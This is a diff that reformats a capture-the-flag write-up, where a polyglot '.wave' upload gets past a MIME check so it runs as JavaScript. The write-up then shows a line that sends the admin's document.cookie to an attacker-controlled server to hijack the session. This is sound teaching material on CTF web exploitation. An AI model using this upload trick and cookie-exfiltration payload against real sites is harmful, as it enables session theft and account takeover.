@@ -29,7 +29,7 @@ It considered as normal wave file since its magic number, but it also can be tra
 
 ```javascript
 RIFF=1;
-alert('test);
+alert('test');
 ```
 
 I've tried script injection with .wav and .mp3 files, but both of them didn't work. It couldn't pass the MIME type check. ![mpeg MIME is not executable](https://i.imgur.com/5wBeF6O.png)
@@ -39,8 +39,9 @@ So I googled about it then I can find a document that lists [default apache MIME
 
 We can see apache doesn't recognize `.wave` extension as `audio/*`, thus including `.wave` file like following allows to script execution.
 
-`<script src="uploads/upload_5aeea228222b70.00604196.wave"></script>`
-
+```html
+<script src="uploads/upload_5aeea228222b70.00604196.wave"></script>
+```
 
 ## Get a flag
 Two steps required to get a flag.
@@ -51,7 +52,9 @@ Two steps required to get a flag.
 ### Show clips of admin
 Since we know how to execute javascript, stealing is easy. Various way to steal admin's clip.
 
-`location.href = <your server> + "?ck=" + "document.cookie"`
+```javascript
+location.href = <your server> + "?ck=" + "document.cookie"
+```
 
 After we change our session to admin's session, we can see two clips.
 
